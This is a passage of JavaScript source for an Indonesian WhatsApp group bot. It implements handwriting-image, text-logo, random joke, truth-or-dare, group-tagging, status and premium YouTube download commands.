                if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
                reply(mess.wait)
                const tulisan = body.slice(11)
                const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './media/nulis/images/buku/sebelumkiri.jpg',
                    '-font',
                    './media/nulis/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '22',
                    '-interline-spacing',
                    '2',
                    '-annotate',
                    '+140+153',
                    fixHeight,
                    './media/nulis/images/buku/setelahkiri.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xinz.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})
                    limitAdd(sender, limit)
                })
            }
                break
            case prefix+'nuliskanan':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
                reply(mess.wait)
                const tulisan = body.slice(12)
                const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', [
                    './media/nulis/images/buku/sebelumkanan.jpg',
                    '-font',
                    './media/nulis/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '23',
                    '-interline-spacing',
                    '2',
                    '-annotate',
                    '+128+129',
                    fixHeight,
                    './media/nulis/images/buku/setelahkanan.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xinz.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})
                    limitAdd(sender, limit)
                })
            }
                break
            case prefix+'foliokiri':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
                reply(mess.wait)
                const tulisan = body.slice(11)
                const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', [
                    './media/nulis/images/folio/sebelumkiri.jpg',
                    '-font',
                    './media/nulis/font/Indie-Flower.ttf',
                    '-size',
                    '1720x1280',
                    '-pointsize',
                    '23',
                    '-interline-spacing',
                    '4',
                    '-annotate',
                    '+48+185',
                    fixHeight,
                    './media/nulis/images/folio/setelahkiri.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xinz.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})
                    limitAdd(sender, limit)
                })
            }
                break
            case prefix+'foliokanan':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
                reply(mess.wait)
                const tulisan = body.slice(12)
                const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', [
                    './media/nulis/images/folio/sebelumkanan.jpg',
                    '-font',
                    './media/nulis/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '23',
                    '-interline-spacing',
                    '3',
                    '-annotate',
                    '+89+190',
                    fixHeight,
                    './media/nulis/images/folio/setelahkanan.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    xinz.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})
                    limitAdd(sender, limit)
                })
            }
                break
//------------------< Text Marker >-------------------
            case prefix+'blackpink': case prefix+'bp':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text`)
                reply(mess.wait)
                sendFileFromUrl(from, `https://api.lolhuman.xyz/api/textprome/blackpink?apikey=${lolkey}&text=${q}`, '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                break
            case prefix+'glitch': case prefix+'glitchtext':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text1|text2`)
                if (!q.includes("|")) return reply(`Penggunaan ${command} text1|text2`)
                reply(mess.wait)
                sendFileFromUrl(from, `https://api.lolhuman.xyz/api/textprome2/glitch?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`, '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                break
            case prefix+'neon': case prefix+'neontext':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text`)
                reply(mess.wait)
                sendFileFromUrl(from, `https://api.lolhuman.xyz/api/textprome/neon?apikey=${lolkey}&text=${q}`, '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                break
            case prefix+'harta': case prefix+'hartatahta': case prefix+'tahta':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text`)
                reply(mess.wait)
                xinz.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=${lolkey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                break
	case prefix+'thundername': case prefix+'thunder':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text`)
                reply(mess.wait)
                sendFileFromUrl(from, `https://api.lolhuman.xyz/api/textprome/thunder?apikey=${lolkey}&text=${q}`, '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                break
            case prefix+'pornhub': case prefix+'phlogo':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text1|text2`)
                if (!q.includes("|")) return reply(`Penggunaan ${command} text1|text2`)
                reply(mess.wait)
                sendFileFromUrl(from, `https://api.lolhuman.xyz/api/textprome2/pornhub?apikey=${lolkey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`, '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                break 
            case prefix+'neon':
                case prefix+'matrix':
                case prefix+'blackpink':
                case prefix+'halloween':
                case prefix+'thundername':
                case prefix+'devilwings':
                case prefix+'cloudtext':
                case prefix+'bloodtext':
                case prefix+'bloodtext2':
                case prefix+'steeltext':
                case prefix+'lavatext':
                case prefix+'toxiclogo':
                case prefix+'dropwater':
                case prefix+'metaldark':
                case prefix+'sandwrite':
                case prefix+'3dwater':
                case prefix+'graffiti':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text\n\nContoh : ${command} xinz`)
                reply(mess.wait)
                xinz.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textpro/${command.slice(1)}?apikey=${apikey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                }
                    break
                case prefix+'graffiti2':
                case prefix+'phlogo':
                case prefix+'glitch':                
                case prefix+'graffiti3':
                case prefix+'layeredtext':
                case prefix+'vintage':
                case prefix+'3dspace':
                case prefix+'stonetext':
                case prefix+'avengers':
                case prefix+'marvellogo':
                case prefix+'3dmetal':
                case prefix+'lionlogo':
                case prefix+'wolflogo':
                case prefix+'ninjalogo':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text1|text2\n\nContoh : ${command} Ramlan|Rara`)
                if (!q.includes("|")) return reply(`Penggunaan ${command} text1|text2\n\nContoh : ${command} Ramlan|Rara`)
                reply(mess.wait)
                xinz.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/textpro2/${command.slice(1)}?apikey=${apikey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                }
                    break
//>>> PHOTOOXY
                case prefix+'shadowtext':
                case prefix+'smoketext':
                case prefix+'romancetext':
                case prefix+'carvedwood':
                case prefix+'harrypotter':
                case prefix+'flamingtext':
                case prefix+'falleaves':
                case prefix+'underwater':
                case prefix+'wolfmetal':
                case prefix+'woodboard':
                case prefix+'undergrass':
                case prefix+'coffetext':
                case prefix+'lovetext':
                case prefix+'burnpaper':
                case prefix+'lovemessage':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text\n\nContoh : ${command} xinz`)
                reply(mess.wait)
                xinz.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/photooxy/${command.slice(1)}?apikey=${apikey}&text=${q}`), '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                }
                    break
                case prefix+'pubglogo':{
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 2) return reply(`Penggunaan ${command} text1|text2\n\nContoh : ${command} Ramlan|Rara`)
                if (!q.includes("|")) return reply(`Penggunaan ${command} text1|text2\n\nContoh : ${command} Ramlan|Rara`)
                reply(mess.wait)
                xinz.sendImage(from, await getBuffer(`https://api.lolhuman.xyz/api/photooxy/pubglogo?apikey=${apikey}&text1=${q.split("|")[0]}&text2=${q.split("|")[1]}`), '', msg).catch(() => reply(mess.error.api))
                limitAdd(sender, limit)
                }
                    break
//------------------< Math Random >-------------------
				case prefix+'ganteng':
					if (!isGroup)return reply(mess.OnlyGrup)
					var kamu = groupMembers
					var cinta = groupMembers
					var aku = cinta[Math.floor(Math.random() * kamu.length)]
					var cintax = kamu[Math.floor(Math.random() * cinta.length)]
					let tejs = `Cowok paling ganteng di group ini adalah\n*@${aku.jid.split('@')[0]}*`
					mentions(tejs, [aku.jid, cintax.jid], true)
					break
				case prefix+'cantik':
					if (!isGroup)return reply(mess.OnlyGrup)
					var kamu = groupMembers
					var cinta = groupMembers
					var aku = cinta[Math.floor(Math.random() * kamu.length)]
					var cintax = kamu[Math.floor(Math.random() * cinta.length)]
					let gejs = `Cewek️ paling cantik di group ini adalah\n*@${cintax.jid.split('@')[0]}*`
					mentions(gejs, [aku.jid, cintax.jid], true)
					break
					case prefix+'jadian':
					if (!isGroup)return reply(mess.OnlyGrup)
					var kamu = groupMembers
					var cinta = groupMembers
					var aku = cinta[Math.floor(Math.random() * kamu.length)]
					var cintax = kamu[Math.floor(Math.random() * cinta.length)]
					let vejs = `Ciee.. yang lagi jadian\n*@${aku.jid.split('@')[0]}* ♥️ @${cintax.jid.split('@')[0]}\nSemoga Langgeng Hii`
					mentions(vejs, [aku.jid, cintax.jid], true)
					break
				case prefix+'seberapagay':
				axios.get(`https://arugaz.herokuapp.com/api/howgay`).then(res => res.data).then(res =>
				textImg(`Nih Liat Data Gay Si ${q}

Persentase Gay : ${res.persen}%
Alert!!! : ${res.desc}`))
				break 
				case prefix+'lirik':
					if (args.length < 1) return reply('Lirik lagunya mana kak?')
					tels = body.slice(7)
					anu = axios.get(`https://arugaz.herokuapp.com/api/lirik?judul=${tels}`, {method: 'get'})
					reply(anu.result)
					break
				case prefix+'bisakah':
					const bisa = ['Tentu Saja Bisa! Kamu Adalah Orang Paling Homky', 'Gak Bisa Ajg Aowkwowk', 'Hmm Gua Gak Tau Yaa, tanya ama bapakau', 'Ulangi Tod Gua Ga Paham']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					xinz.sendMessage(from, 'Pertanyaan : bisakah ' + q + '\n\nJawaban : ' + keh, text, { quoted: msg })
					break
					case prefix+'kapankah':
					const kapan = ['Besok', 'Lusa', 'Tadi', '4 Hari Lagi', '5 Hari Lagi', '6 Hari Lagi', '1 Minggu Lagi', '2 Minggu Lagi', '3 Minggu Lagi', '1 Bulan Lagi', '2 Bulan Lagi', '3 Bulan Lagi', '4 Bulan Lagi', '5 Bulan Lagi', '6 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', '6 Tahun Lagi', '1 Abad lagi', '3 Hari Lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					xinz.sendMessage(from, 'Pertanyaan : kapankah ' + q + '\n\nJawaban : ' + koh, text, { quoted: msg })
					break

				case prefix+'apakah':
					const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Ulangi bro gak paham']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					xinz.sendMessage(from, 'Pertanyaan : apakah ' + q + '\n\nJawaban : ' + kah, text, { quoted: msg })
					break

				case prefix+'rate':
					const ra = ['4', '9', '17', '28', '34', '48', '59', '62', '74', '83', '97', '100', '29', '94', '75', '82', '41', '39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					xinz.sendMessage(from, 'Pertanyaan : ' + q + '\n\nJawaban : ' + te + '%', text, { quoted: msg })
					break

				case prefix+'hobby':
					const hob = ['Desah Di Game', 'Ngocokin Doi', 'Stalking sosmed nya mantan', 'Kau kan gak punya hobby awokawok', 'Memasak', 'Membantu Atok', 'Mabar', 'Nobar', 'Sosmedtan', 'Membantu Orang lain', 'Nonton Anime', 'Nonton Drakor', 'Naik Motor', 'Nyanyi', 'Menari', 'Bertumbuk', 'Menggambar', 'Foto fotoan Ga jelas', 'Maen Game', 'Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					xinz.sendMessage(from, 'Pertanyaan : ' + q + '\n\nJawaban : ' + by, text, { quoted: msg })
					break

				case prefix+'truth':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
					const ttrth = trut[Math.floor(Math.random() * trut.length)]
					xinz.sendImage(from, await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`), 'Truth\n\n' + ttrth, msg)
					break

				case prefix+'dare':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					const dare = ['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
					const der = dare[Math.floor(Math.random() * dare.length)]
					xinz.sendImage(from, await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`), 'Dare\n\n' + der , msg)
					break
				case prefix+'cekbapak': // By Ramlan ID
					const bapak = ['Wah Mantap Lu Masih Punya Bapack\nPasti Bapack Nya Kuli :v\nAwowkwokwwok\n#CandabOs', 'Aowkwwo Disini Ada Yteam :v\nLu Yteam Bro? Awowkwowk\nSabar Bro Ga Punya Bapack\n#Camda', 'Bjir Bapack Mu Ternyata Sudah Cemrai\nSedih Bro Gua Liatnya\nTapi Nih Tapi :v\nTetep Ae Lu Yteam Aowkwowkw Ngakak :v', 'Jangan #cekbapak Mulu Broo :v\nKasian Yang Yteam\nNtar Tersinggung Kan\nYahahaha Hayyuk By : Ramlan ID']
					const cek = bapak[Math.floor(Math.random() * bapak.length)]
					xinz.sendMessage(from, cek, text, { quoted: msg })
					break
//------------------< Baileys >---------------------
            case prefix+'tagme':
                mentions(`@${sender.split("@")[0]}`, [sender], true)
                break
            case prefix+'kontak':
                if (args.length < 2) return reply(`Penggunaan ${command} nomor|nama`)
                if (!q.includes("|")) return reply(`Penggunaan ${command} nomor|nama`)
                if (isNaN(q.split("|")[0])) return reply(`Penggunaan ${command} nomor|nama`)
                xinz.sendContact(from, q.split("|")[0], q.split("|")[1], msg)
                break
            case prefix+'hidetag':{
                if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}donasi* untuk membeli premium`)
                if (args.length < 2) return reply(`Masukkan text`)
                let arr = [];
                for (let i of groupMembers){
                    arr.push(i.jid)
                }
                mentions(q, arr, false)
            }
                break
//------------------< INFO >-------------------
            case prefix+'limit': case prefix+'ceklimit': case prefix+'balance': case prefix+'glimit':
                if (mentioned.length !== 0){
                    textImg(`Limit : ${_prem.checkPremiumUser(mentioned[0], premium) ? 'Unlimited' : `${getLimit(mentioned[0], limitCount, limit)}/${limitCount}`}\nLimit Game : ${cekGLimit(mentioned[0], gcount, glimit)}/${gcount}\nBalance : $${getBalance(mentioned[0], balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                } else {
                    textImg(`Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}\nLimit Game : ${cekGLimit(sender, gcount, glimit)}/${gcount}\nBalance : $${getBalance(sender, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
                }
                break
            case prefix+'owner':
            case prefix+'creator':{
            xinz.sendContact(from, ownerNumber.split("@")[0], setting.ownerName, msg)
            await reply(`Hai Kak kenalin Nama Owner Saya Ya Kak`)
            }
                  break
            case prefix+'ping':
            case prefix+'speed':{
                let timestamp = speed();
				let latensi = speed() - timestamp
                textImg(`${latensi.toFixed(4)} Second`)
            }
                break
            case prefix+'donate': case prefix+'donasi':
                textImg(setting.txtDonasi)
                break
            case prefix+'sourcecode': case prefix+'sc': case prefix+'src':
                textImg(`Bot ini menggunakan sc : Punya Sc Saya Sendiri:v`)
                break
            case prefix+'runtime':
                textImg(`RUNTIME\n\n${runtime(process.uptime())}`)
                break
            case prefix+'stats': 
            case prefix+'botstat':{
                let totalchat = await xinz.chats.all()
				let i = []
				let giid = []
				for (let mem of totalchat){
					i.push(mem.jid)
				}
				for (let id of i){
					if (id && id.includes('g.us')){
						giid.push(id)
					}
				}
                let timestampi = speed();
				let latensii = speed() - timestampi
                const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xinz.user.phone
                let anu = process.uptime()
                let teskny = `*V. Whatsapp :* ${wa_version}
*Baterai :* ${baterai.baterai}%
*Charge :* ${baterai.cas === 'true' ? 'Ya' : 'Tidak'}
*RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*MCC :* ${mcc}
*MNC :* ${mnc}
*Versi OS :* ${os_version}
*Merk HP :* ${device_manufacturer}
*Versi HP :* ${device_model}
*Group Chat :* ${giid.length}
*Personal Chat :* ${totalchat.length - giid.length}
*Total Chat :* ${totalchat.length}
*Speed :* ${latensii.toFixed(4)} Second
*Runtime :* ${runtime(anu)}`
				reply(teskny)
            }
				break
//------------------< Downloader User Premium>-------------------
            case prefix+'ytmp4':{
                if (!isPremium) return reply(`Maaf Anda Tidak Terdaftar User Premium , Mau Beli User Premium? Ketik ${prefix}donasi`)
                if (args.length === 1) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
                let isLinks2 = args[1].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
                if (!isLinks2) return reply(mess.error.Iv)
                try {
                    reply(mess.wait)
                    ytv(args[1])
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                            if (Number(filesize) >= 40000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Filesize : ${filesizeF}\`\`\`
\`\`\`▢ Link : ${a.data}\`\`\`
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, msg)
                        const captionsYtmp4 = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                            sendFileFromUrl(from, thumb, captionsYtmp4, msg)
                            sendFileFromUrl(from, dl_link, '', msg)
                            limitAdd(sender, limit)
                        })
                    })
                    .catch((err) => reply(`${err}`))
                } catch (err) {
                    sendMess(ownerNumber, 'Ytmp4 Error : ' + err)
                    console.log(color('[Ytmp4]', 'red'), err)
                    reply(mess.error.api)
                }
            }
                break
            case prefix+'ytmp3':{
                if (!isPremium) return reply(`Maaf Anda Tidak Terdaftar User Premium , Mau beli user premium? ketik ${prefix}donasi`)
                if (args.length === 1) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
                let isLinks = args[1].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
                if (!isLinks) return reply(mess.error.Iv)
                try {
                    reply(mess.wait)
                    yta(args[1])
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                            if (Number(filesize) >= 30000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}
\`\`\`▢ Ext : MP3
\`\`\`▢ Filesize : ${filesizeF}
\`\`\`▢ Link : ${a.data}
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, msg)
                        const captions = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP3\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                            sendFileFromUrl(from, thumb, captions, msg)
                            sendFileFromUrl(from, dl_link, '', msg)
                            limitAdd(sender, limit)
                        })
                    })
                    .catch((err) => reply(`${err}`))
                } catch (err) {
                    sendMess(ownerNumber, 'Ytmp3 Error : ' + err)
                    console.log(color('[Ytmp3]', 'red'), err)
                    reply(mess.error.api)
                }
            }
                break
            case prefix+'playmp4':{
                if (!isPremium) return reply(`Maaf Anda Tidak Terdaftar User Premium Mau beli User premium? Ketok ${prefix}donasi`)
                if (args.length === 1) return reply(`Kirim perintah *${prefix}playmp4 query*`)
                try {
                    reply(mess.wait)
                    let yut = await yts(q)
                    ytv(yut.videos[0].url)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                            if (Number(filesize) >= 40000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Filesize : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ Link : ${a.data}\`\`\`
_Untuk durasi lebih dari batas disajikan dalam bentuk link_`, msg)
                        const captionisu = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Title : ${title}\`\`\`
\`\`\`▢ Ext : MP4\`\`\`
\`\`\`▢ Size : ${filesizeF}\`\`\`
\`\`\`▢ ID : ${yut.videos[0].videoId}\`\`\`
\`\`\`▢ Upload : ${yut.videos[0].ago}\`\`\`
\`\`\`▢ Ditonton : ${yut.videos[0].views}\`\`\`
\`\`\`▢ Duration : ${yut.videos[0].timestamp}\`\`\`
\`\`\`▢ URL : ${yut.videos[0].url}\`\`\`

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                            sendFileFromUrl(from, thumb, captionisu, msg)
                            sendFileFromUrl(from, dl_link, '', msg)
                            limitAdd(sender, limit)
                        })
                    })
                    .catch((err) => reply(`${err}`))
                } catch (err) {
                    sendMess(ownerNumber, 'PlayMp4 Error : ' + err)
                    console.log(color('[PlayMp4]', 'red'), err)
                    reply(mess.error.api)
                }
            }
                break
            case prefix+'play': case prefix+'playmp3':{
                if (!isPremium) return reply(`Maaf Anda Tidak Terdaftar User Premium , Mau beli User Premium? Ketik ${prefix}donasi`)
                if (args.length === 1) return reply(`Kirim perintah *${prefix}play query*`)
                try {
                    reply(mess.wait)
                    let yut = await yts(q)
                    yta(yut.videos[0].url)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
                        .then((a) => {
                            if (Number(filesize) >= 30000) return sendFileFromUrl(from, thumb, `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE PLAYMP3*
